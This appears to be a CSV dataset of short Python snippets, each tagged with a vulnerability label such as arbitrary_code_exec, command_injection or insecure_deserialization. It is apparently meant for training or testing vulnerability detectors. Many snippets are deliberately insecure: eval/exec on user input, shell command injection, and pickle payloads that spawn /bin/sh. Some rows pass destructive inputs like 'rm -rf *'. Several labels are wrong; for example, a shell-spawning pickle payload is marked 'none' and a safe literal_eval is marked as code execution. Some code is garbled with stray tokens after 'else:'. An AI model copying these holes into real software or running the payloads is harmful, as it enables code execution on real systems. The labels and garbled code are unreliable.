snippet,vulnerability
"import threading
class BankAccount:
    def __init__(self):
        self.balance = 0
    def deposit(self, amount):
        current_balance = self.balance
        for _ in range(10000000):
            pass
        self.balance = current_balance + amount
def perform_transactions():
    account = BankAccount()
    threads = []
    for _ in range(1000):
        t = threading.Thread(target=account.deposit, args=(1,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print(f""Final balance: {account.balance}"")
perform_transactions()",['none']
"import flask
app = flask.Flask(__name__)
@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = flask.request.json
    result = eval(data['expression'])
    return str(result)
if __name__ == ""__main__"":
    app.run()",['arbitrary_code_exec']
"import pickle
import os
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.Popen, (['echo', 'You have been hacked'],))
data = pickle.dumps(RCE())
pickle.loads(data)",['insecure_deserialization']
"import os
def evaluate_input(user_input):
    return eval(user_input)
while True:
    user_input = input(""Enter something to evaluate: "")
    print(evaluate_input(user_input))",['arbitrary_code_exec']
"def run_code(user_input):
    eval(user_input)
if __name__ == ""__main__"":
    user_input = input(""Enter some python code: "")
    run_code(user_input)",['arbitrary_code_exec']
"import os
def execute_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import os
import re
from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    sanitized_code = re.sub(r'\b(os|sys|eval)\b', '', code)
    exec(sanitized_code)
    return 'Code executed successfully!'
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import ast
class RestrictedEval(ast.NodeVisitor):
    def visit(self, node):
        if isinstance(node, self.whitelist):
            super().visit(node)
        else:
            raise ValueError(f""Unsupported operation {type(node).__name__}"")
    whitelist = ast.Expression
def evaluate_input(user_input):
    tree = compile(user_input, ""<string>"", ""eval"")
    restricted_eval = RestrictedEval()
    restricted_eval.visit(tree)
    return eval(tree)
while True:
    user_input = input(""Enter something to evaluate: "")
    try:
        print(evaluate_input(user_input))
    except Exception as e:
        print(f""Invalid input: {e}"")",['arbitrary_code_exec']
"import time
def check_password(input_password):
    actual_password = ""secret""
    if input_password == actual_password:
        return True
    Else:
        return False
def main():
    input_password = input(""Enter your password: "")
    start = time.time()
    if check_password(input_password):
        print(""Access granted."")
    else:
        print(""Access denied."")
    end = time.time()
    print(""Time taken: "", end - start)
if __name__ == ""__main__"":
    main()",['none']
"from flask import Flask, request, redirect, abort
from urllib.parse import urlparse
app = Flask(__name__)
ALLOWED_DOMAINS = ['www.example.com', 'www.test.com']
def is_safe_redirect_url(target):
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return test_url.scheme in ('http', 'https') and ref_url.netloc == test_url.netloc and test_url.netloc in ALLOWED_DOMAINS
@app.route('/redirect')
def safe_redirect():
    url = request.args.get('url')
    if not is_safe_redirect_url(url):
        abort(400)
    return redirect(url)
if __name__ == ""__main__"":
    app.run(debug=True)",['none']
"import ast
def my_function():
    user_input = input(""Enter something: "")
    try:
        result = ast.literal_eval(user_input)
        print(result)
    except (ValueError, SyntaxError):
        print(""Invalid input"")
my_function()",['arbitrary_code_exec']
"import shlex
import subprocess
def execute_command(user_input):
    args = shlex.split(user_input)
    if len(args) == 0 or any(arg == '' for arg in args):
        raise ValueError('Invalid command')
    process = subprocess.run(args, capture_output=True, text=True)
    return process.stdout, process.stderr
try:
    user_input = ""ls ; rm -rf *""
    output, error = execute_command(user_input)
    print(""Output:"", output)
    print(""Error:"", error)
except ValueError as e:
    print(e)",['none']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked""'
    def __reduce__(self):
        return (subprocess.Popen, ([self.command],))
safe_object = SafeClass()
serialized_object = pickle.dumps(safe_object)
deserialized_object = pickle.loads(serialized_object)",['insecure_deserialization']
"from flask import Flask, request, abort
app = Flask(__name__)
@app.route('/echo', methods=['POST'])
def echo():
    if 'data' not in request.form:
        abort(400, ""Missing 'data' field in POST request."")
    data = request.form['data']
    max_length = 1000
    if len(data) > max_length:
        abort(400, f""'data' field is too long. Maximum allowed length is {max_length} characters."")
    return f""Echo: {data}""
if __name__ == '__main__':
    app.run(port=8000)",['none']
"import pickle
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh', '-c', 'echo ""You have been hacked""'],))
def serialize_exploit():
    with open('exploit.pickle', 'wb') as f:
        pickle.dump(RCE(), f)
def deserialize_exploit():
    with open('exploit.pickle', 'rb') as f:
        pickle.load(f)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import os
def execute_command(user_input):
    command = user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import os
def run_command_vulnerable(user_input):
    if not user_input.isalpha():
        command = ""ls {}"".format(shlex.quote(user_input))
        os.system(command)",['command_injection']
"import pickle
import os
import subprocess
class SafeClass:
    def __reduce__(self):
        return (subprocess.run, (['echo', 'pwned'], stdout=open('/tmp/pwnd', 'w')))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
serialize_and_deserialize(safe_object)",['insecure_deserialization']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh(), protocol=0)
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
if __name__ == ""__main__"":
    serialize_exploit()",['none']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Not allowed')
        ast.NodeVisitor.generic_visit(self, node)
def run_user_input():
    user_input = input(""Enter command: "")
    tree = compile(user_input, ""<input>"", ""exec"")
    for item in tree.body:
        RestrictedPython().visit(item)
    exec(tree)
run_user_input()",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo Hello, world > malicious_file.txt',))
def serialize():
    obj = VulnerableClass()
    serialized_obj = pickle.dumps(obj)
    return serialized_obj
def deserialize(serialized_obj):
    obj = pickle.loads(serialized_obj)
    return obj
if __name__ == ""__main__"":
    serialized_obj = serialize()
    deserialize(serialized_obj)",['insecure_deserialization']
"import ast
class RestrictedEval(ast.NodeVisitor):
    def visit_Call(self, node):
        raise ValueError(""RestrictedEval: cannot call functions"")
def restricted_eval(node):
    visitor = RestrictedEval()
    visitor.visit(node)
def command_execution(user_input):
    tree = ast.parse(user_input, mode='single')
    restricted_eval(tree)
    compiled_code = compile(tree, filename=""<ast>"", mode='eval')
    return eval(compiled_code)
user_input = input(""Enter your command: "")
try:
    print(command_execution(user_input))
except Exception as e:
    print(f""An error occurred: {e}"")",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id not in ['print', 'open']:
            raise ValueError('Function call not allowed')
        self.generic_visit(node)
def validate_code(code):
    tree = ast.parse(code, mode='single')
    RestrictedPython().visit(tree)
def execute_user_input():
    user_input = input(""Enter your command: "")
    try:
        validate_code(user_input)
        exec(user_input)
    except Exception as e:
        print(f""Invalid input: {e}"")
execute_user_input()",['arbitrary_code_exec']
"import os
import sys
def evaluate_user_input(user_input):
    if len(user_input) > 1024:
        print(""Input too long"")
        return
    result = eval(user_input)
    print(f""Result: {result}"")
if __name__ == ""__main__"":
    while True:
        user_input = input(""Enter your expression: "")
        evaluate_user_input(user_input)","['arbitrary_code_exec', 'buffer_overflow']"
"import os
def run_command(user_input):
    command = ""echo Hello, "" + user_input
    os.system(command)
def sanitize_input(user_input):
    return user_input.replace("";"", """").replace(""&"", """").replace(""|"", """")
while True:
    user_input = input(""Enter your name: "")
    sanitized_input = sanitize_input(user_input)
    eval('run_command(""'+sanitized_input+'"")')","['arbitrary_code_exec', 'command_injection']"
"import random
def random_divide(a, b):
    return a / b
def main():
    a = random.randint(0, 10)
    b = random.randint(0, 10)
    try:
        result = random_divide(a, b)
    except Exception as e:
        print(""An error occurred: "", e)
    else:
        print(""The result is: "", result)
if __name__ == ""__main__"":
    main()",['none']
"import subprocess
import shlex
def execute_command(user_input):
    args = shlex.split(user_input)
    if len(args) == 1 and args[0].isalpha():
        command = ""ls""
        process = subprocess.Popen([command, args[0]], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, error = process.communicate()
        if process.returncode != 0:
            print(f""Command failed with error: {error}"")
        else:
            print(output)
    else:
        print(""Invalid input. Please enter alphabetic characters only."")
user_input = input(""Enter your command: "")
execute_command(user_input)","['command_injection', 'path_traversal']"
"import struct
def receive_and_process_data(sock):
    data = sock.recv(1024)
    unpacked_data = struct.unpack('>I', data)
    return unpacked_data[0]
def process_request(sock):
    while True:
        data = receive_and_process_data(sock)",['none']
"def get_user_input():
    while True:
        try:
            user_input = input(""Enter your name: "")
            if len(user_input) > 256:
                raise ValueError(""Input too long"")
            return user_input
        except ValueError as e:
            print(e)
            print(""Please, enter a valid name."")
def print_name(name):
    print(""Your name is: "" + name)
def main():
    name = get_user_input()
    print_name(name)",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
result = serialize_and_deserialize(vulnerable_object)
print(result)",['insecure_deserialization']
"@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    if not username or not password:
        return ""Invalid credentials!""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    cursor.execute(query, (username, password))
    if cursor.fetchone() is not None:
        return ""Login successful!""
    else: constrained
        return ""Invalid credentials!""",['none']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.message = ""You have been hacked!""
    def __repr__(self):
        return f""SafeClass('{self.message}')""
    def display_message(self):
        print(self.message)
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
deserialized_object = serialize_and_deserialize(safe_object)
deserialized_object.display_message()",['insecure_deserialization']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
safe_data = pickle.dumps(SafePickle())
pickle.loads(safe_data)",['insecure_deserialization']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
vulnerable_object = VulnerableClass()
serialized_object = pickle.dumps(vulnerable_object)
deserialized_object = pickle.loads(serialized_object)",['insecure_deserialization']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == ""eval"":
            raise ValueError(""Eval function is not allowed"")
        return self.generic_visit(node)
def evaluate_code(user_input):
    tree = compile(user_input, ""<string>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(tree)
user_input = input(""Enter some Python code to execute: "")
evaluate_code(user_input)",['arbitrary_code_exec']
"import pickle
import os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo ""Remote Code Execution""',))
def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(Exploit(), f)
serialize_exploit()",['none']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    data = pickle.dumps(EvilPickle())
    with open('exploit.pkl', 'wb') as f:
        f.write(data)
def deserialize_exploit():
    with open('exploit.pkl', 'rb') as f:
        pickle.load(f)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import os
def evaluate_expression(expression):
    return eval(expression)
user_input = input(""Enter an expression: "")
print(evaluate_expression(user_input))",['arbitrary_code_exec']
"def format_string(user_input):
    return f""User input: {user_input}""
def main():
    user_input = input(""Enter some text: "")
    sanitized_input = user_input.encode('utf-8', 'ignore').decode('utf-8')
    formatted = format_string(sanitized_input)
    print(formatted)
if __name__ == ""__main__"":
    main()",['none']
"import pickle
import os
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""You have been hacked!""'],))
def serialize_and_deserialize():
    serialized = pickle.dumps(EvilClass())
    deserialized = pickle.loads(serialized)
    return deserialized
if __name__ == '__main__':
    serialize_and_deserialize()",['insecure_deserialization']
"import sys
sys.setrecursionlimit(20000)
def recursive_function(n):
    if n == 0:
        return 1
    else:otted-fossa
        return n * recursive_function(n - 1)
print(recursive_function(10**6))",['none']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    obj = pickle.loads(data)
    return obj
serialize_and_deserialize()",['insecure_deserialization']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            return self.generic_visit(node)
        else:
            raise ValueError('The eval and exec functions are not allowed')
def execute_user_input():
    user_input = input(""Enter some Python code to execute: "")
    tree = compile(user_input, ""<input>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(user_input)
execute_user_input()",['arbitrary_code_exec']
"import os
def run_user_code(user_input):
    exec(user_input)
run_user_code(input(""Enter your Python code: ""))",['arbitrary_code_exec']
"def unsafe_code_execution():
    user_input = input(""Enter some Python code: "")
    exec(user_input)
unsafe_code_execution()",['arbitrary_code_exec']
"import subprocess
def execute_command(user_input):
    command = ""ls "" + user_input
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(result.stdout)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['exec', 'eval']):
            return self.generic_visit(node)
        else:
            raise ValueError('Restricted call')
def validate_code(code):
    tree = ast.parse(code, mode='single')
    RestrictedPython().visit(tree)
def execute_user_input():
    user_input = input(""Enter your command: "")
    validate_code(user_input)
    exec(user_input)
execute_user_input()",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = ""echo %s"" % user_input
    os.system(command)
def run_eval(user_input):
    eval(user_input)
while True:
    user_input = input(""Enter your command: "")
    try:
        run_command(user_input)
    except Exception as e:
        print(""Error: "", e)
        run_eval(user_input)","['arbitrary_code_exec', 'command_injection']"
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('malicious.pickle', 'wb') as f:
        pickle.dump(malicious, f)
serialize_exploit()",['none']
"import pickle
import os
class VulnerableClass:
    def __init__(self):
        self.data = ""Sensitive Data""
untrusted_data = 'YOUR SHELLCODE HERE'
with open('data.pickle', 'wb') as file:
    pickle.dump(untrusted_data, file)
with open('data.pickle', 'rb') as file:
    loaded_data = pickle.load(file)
vulnerable_object = VulnerableClass()
print(vulnerable_object.data)
os.remove('data.pickle')",['insecure_deserialization']
"import sys
def process_input(user_input):
    buffer = bytearray(user_input[:1024])
    return buffer
if __name__ == ""__main__"":
    user_input = sys.stdin.buffer.read()
    print(process_input(user_input))",['buffer_overflow']
"import ast
import os
class RestrictedUnsafeEval(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == ""__import__"":
            raise ValueError(""__import__ is not allowed"")
        self.generic_visit(node)
def safe_eval(user_input):
    tree = ast.parse(user_input, mode='single')
    RestrictedUnsafeEval().visit(tree)
    return eval(user_input)
try:
    print(safe_eval(""__import__('os').system('rm -rf *')""))
except Exception as e:
    print(f""An error occurred: {e}"")",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))
pickled = pickle.dumps(EvilPickle())
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"def calculate_sum(n1, n2):
    try:
        return int(n1) + int(n2)
    except ValueError:
        print(""Invalid input. Please enter valid integer values."")
        return None
num1 = input(""Enter first number: "")
num2 = input(""Enter second number: "")
result = calculate_sum(num1, num2)
if result is not None:
    print(""The sum is: "" + str(result))",['none']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.call, (['echo', 'You have been hacked', '>', '/tmp/hacked.txt'],))
safe_pickle = SafePickle()
pickled = pickle.dumps(safe_pickle)
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import os
import subprocess
def execute_command(user_input):
    if len(user_input) > 256:
        raise ValueError('Input too long')
    command = [""ls"", ""-l"", user_input]
    subprocess.run(command, check=True)
try:
    execute_command(""very_long_string"" * 1024)
except ValueError:
    print(""Input too long"")",['path_traversal']
"import time
def login():
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    if username == ""admin"" and password == ""password"":
        return True
    else:archar
        return False
def main():
    if login():
        command = input(""Enter a command: "")
        eval(command)
    else:
        print(""Login failed."")",['arbitrary_code_exec']
"import sys
def process_input(user_input):
    buffer = bytearray(1024)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer
if __name__ == ""__main__"":
    user_input = sys.stdin.buffer.read()
    print(process_input(user_input))",['buffer_overflow']
"import os
def vulnerable_function(user_input):
    command = ""echo %s > /dev/null"" % (user_input)
    os.system(command)
vulnerable_function(""This is a test"")",['command_injection']
"def evaluate_input(user_input):
    allowed_operations = ['+', '-', '*', '/']
    for operation in allowed_operations:
        if operation in user_input:
            try:
                return eval(user_input)
            except SyntaxError:
                return ""Invalid expression""
    return ""Invalid operation""
user_input = input(""Enter something to evaluate: "")
print(evaluate_input(user_input))",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!"" > /tmp/hacked.txt',))
def serialize_and_write(obj, filename):
    with open(filename, 'wb') as f:
        pickle.dump(obj, f)
def read_and_deserialize(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)
serialize_and_write(EvilClass(), '/tmp/malicious.pkl')
read_and_deserialize('/tmp/malicious.pkl')",['insecure_deserialization']
"import logging
class BankAccount:
    def __init__(self, balance):
        self.balance = balance
    def withdraw(self, amount):
        try:
            if amount > self.balance:
                raise ValueError(""Insufficient funds"")
            self.balance -= amount
        except Exception as e:
            logging.error(e)
bank_account = BankAccount(1000)
bank_account.withdraw(2000)",['none']
"import pickle
import os
class TestObject(object):
    def __init__(self):
        self.data = ""Test Data""
def serialize_and_deserialize():
    test_object = TestObject()
    serialized_data = pickle.dumps(test_object)
    deserialized_data = pickle.loads(serialized_data)
    return deserialized_data
def execute_command(command):
    os.system(command)","['command_injection', 'insecure_deserialization']"
"import subprocess
def run_command(user_input):
    command = user_input.split()
    subprocess.run(command, shell=False)
run_command(input(""Enter a command: ""))",['command_injection']
"import os
import shlex
def execute_command(user_input):
    sanitized_input = shlex.quote(user_input)
    command = 'ls ' + sanitized_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import struct
def format_string(user_input):
    return ""User input: %s"" % user_input
def main():
    user_input = input(""Enter some text: "")
    formatted = format_string(user_input)
    print(formatted)
if __name__ == ""__main__"":
    main()",['none']
"import socket
def create_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((""example.com"", 80))
    except Exception as e:
        print(f""Exception occurred: {e}"")
        s.close()
        return None
    return s
connections = []
for i in range(10000):
    conn = create_connection()
    if conn is not None:
        connections.append(conn)
for conn in connections:
    conn.close()",['none']
"def safe_function(user_input):
    exec(user_input, locals())
safe_function('print(""Hello, World"")')",['arbitrary_code_exec']
"import os
import sys
def vulnerable_function():
    try:
        user_input = input(""Enter your command: "")
        os.system(user_input)
    except Exception as e:
        print(""An error occurred: "", e)
if __name__ == ""__main__"":
    vulnerable_function()",['command_injection']
"def vulnerable_function(user_input):
    buffer = bytearray(1024)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer
user_input = input(""Enter your input: "")
vulnerable_function(user_input)",['buffer_overflow']
"import subprocess
def run_command(user_input):
    command = [""ls"", ""-l""]
    subprocess.call(command)
run_command(""rm -rf /"")",['none']
"import pickle
import os
class VulnerableClass:
    def __init__(self):
        self.data = []
    def add_data(self, item):
        self.data.append(item)
    def save_to_file(self, filename):
        with open(filename, 'wb') as file:
            pickle.dump(self, file)
def load_from_file(filename):
    with open(filename, 'rb') as file:
        return pickle.load(file)
vuln_instance = VulnerableClass()
for i in range(1000000):
    vuln_instance.add_data('A' * 1000000)
vuln_instance.save_to_file('vuln_file.pkl')
loaded_instance = load_from_file('vuln_file.pkl')",['insecure_deserialization']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""You have been hacked!""'],))
data = pickle.dumps(SafePickle())
pickle.loads(data)",['insecure_deserialization']
"def get_user_input():
    user_input = input(""Enter your name: "")
    return user_input
def print_name(name):
    print(""Your name is: "" + name)
def main():
    name = get_user_input()
    print_name(name)
if __name__ == ""__main__"":
    main()",['none']
"def calculate_sum(n1, n2):
    return n1 + n2
num1 = input(""Enter first number: "")
num2 = input(""Enter second number: "")
result = calculate_sum(num1, num2)
print(""The sum is: "" + str(result))",['none']
"import pickle
import os
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked!""'
    def execute_command(self):
        subprocess.Popen(self.command, shell=True)
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
result = serialize_and_deserialize(safe_object)
result.execute_command()",['insecure_deserialization']
"import os
def execute_command(user_input):
    command = ""ls -l "" + user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import os
def get_user_input():
    return input(""Enter something: "")
def evaluate_input(user_input):
    eval(user_input)
def main():
    user_input = get_user_input()
    evaluate_input(user_input)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = eval(user_input)
    os.system(command)
run_command(input(""Enter your command: ""))","['arbitrary_code_exec', 'command_injection']"
"def handle_request():
    user_input = input(""Enter your name: "")
    print(""Hello, "" + user_input)
handle_request()",['none']
"import subprocess
def execute_user_input():
    user_input = input(""Enter your command: "")
    if all(char.isalnum() or char.isspace() for char in user_input):
        subprocess.run(user_input, shell=True, check=True)
    else:
        print(""Invalid input. Only alphanumeric characters and spaces are allowed."")",['command_injection']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
data = pickle.dumps(SafePickle())
pickle.loads(data)",['insecure_deserialization']
"import pickle
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],),)
def serialize_exploit():
    serialized = pickle.dumps(EvilPickle())
    with open('pickled_exploit', 'wb') as file:
        file.write(serialized)
def deserialize_exploit():
    with open('pickled_exploit', 'rb') as file:
        pickle.load(file)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"def vulnerable_function():
    user_input = input(""Enter some Python code: "")
    exec(user_input)
vulnerable_function()",['arbitrary_code_exec']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        pickle.load(f)",['insecure_deserialization']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(EvilClass(), f)
serialize_exploit()",['none']
"import subprocess
def execute_user_input():
    user_input = input(""Enter your command: "")
    if all(c.isalnum() or c.isspace() for c in user_input):
        try:
            subprocess.run(user_input, shell=True, check=True)
        except Exception as e:
            print('Error:', e)
    else:
        print('Invalid input')
execute_user_input()",['command_injection']
"import os
def run_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
run_command('-la')",['command_injection']
"app = Flask(__name__)
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username, password=password).first()
        if user:
            return ""Logged in successfully"", 200
        else:ellow
            return ""Invalid credentials"", 401",['none']
"import pickle
import os
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.run, (['id'], capture_output=True, text=True))
rce = RCE()
pickled = pickle.dumps(rce)
result = pickle.loads(pickled)
print(result.stdout)",['insecure_deserialization']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_ImportFrom(self, node):
        if node.module == 'os':
            raise ValueError('Importing from os module is not allowed')
        return self.generic_visit(node)
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == 'os':
            raise ValueError('Calling functions from os module is not allowed')
        return self.generic_visit(node)
def restricted_exec(code, locals=None, globals=None):
    parsed = ast.parse(code, mode='exec')
    transformed = RestrictedPython().visit(parsed)
    compiled = compile(transformed, filename='<ast>', mode='exec')
    exec(compiled, locals, globals)
restricted_exec(input(""Enter your Python code: ""))",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = ""ls -l "" + user_input
    os.system(command)
run_command(""-"" * 10000000)",['command_injection']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', ""You have been hacked!""],))
data = pickle.dumps(SafePickle())
pickle.loads(data)",['insecure_deserialization']
"import os
import sys
def some_function():
    try:
        os.system('ls')
    except Exception as e:
        print(e)
if __name__ == ""__main__"":
    some_function()",['none']
"import os
def vulnerable_function():
    user_input = input(""Enter what you want to execute: "")
    eval(user_input)
vulnerable_function()",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))
def serialize_and_deserialize():
    evil = EvilClass()
    serialized_data = pickle.dumps(evil)
    deserialized_data = pickle.loads(serialized_data)
serialize_and_deserialize()",['insecure_deserialization']
"import sqlite3
from sqlite3 import Error
def fetch_user_data(username):
    try:
        conn = sqlite3.connect('my_database.db')
        cursor = conn.cursor()
        cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
        user_data = cursor.fetchone()
        return user_data
    except Error as e:
        print(e)
    finally:
        if conn:
            conn.close()",['none']
"import subprocess
def get_user_input():
    user_input = input(""Enter your command: "")
    return user_input
def execute_command(command):
    try:
        subprocess.run(command, shell=True, check=True)
    except Exception as e:
        print(f""Error occurred while executing command: {e}"")
def main():
    command = get_user_input()
    execute_command(command)
if __name__ == ""__main__"":
    main()",['command_injection']
"def get_user_input():
    return input(""Enter your command: "")
def execute_command(cmd):
    eval(cmd)
def main():
    cmd = get_user_input()
    execute_command(cmd)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import pickle
import subprocess
class SafeClass(object):
    def __init__(self):
        self.command = 'echo ""Hacked!""'
    def __reduce__(self):
        return (subprocess.run, (self.command,))
def serialize_and_deserialize():
    data = pickle.dumps(SafeClass())
    obj = pickle.loads(data)
    return obj
serialize_and_deserialize()",['insecure_deserialization']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
vulnerable_data = pickle.dumps(VulnerableClass())
pickle.loads(vulnerable_data)",['insecure_deserialization']
